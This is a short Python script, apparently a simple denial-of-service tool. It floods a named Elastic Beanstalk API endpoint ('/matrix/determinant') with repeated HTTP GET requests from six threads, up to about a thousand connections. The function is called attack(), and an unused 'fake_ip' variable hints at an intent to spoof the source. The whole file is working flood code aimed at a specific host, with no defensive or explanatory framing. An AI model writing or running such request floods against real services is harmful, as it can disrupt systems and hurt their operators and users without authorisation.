import socket
import threading

target = "islandiiapi-env.eba-pfi6s4xx.eu-west-2.elasticbeanstalk.com"
port = 80

fake_ip = '182.21.20.32'

already_connected = 0


def attack():
    while True:
        global already_connected
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((target, port))
                request = "GET /matrix/determinant HTTP/1.1\r\nHost:%s\r\n\r\n" % target
                s.send(request.encode())
                dd = s.recv(2048)
                print(dd)
            except Exception as e:
                print(e)
        already_connected += 1
        if already_connected == 1000: break


if __name__ == '__main__':
    threads = []

    clients_number = 6

    for i in range(clients_number):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)
    for th in threads:
        th.join()
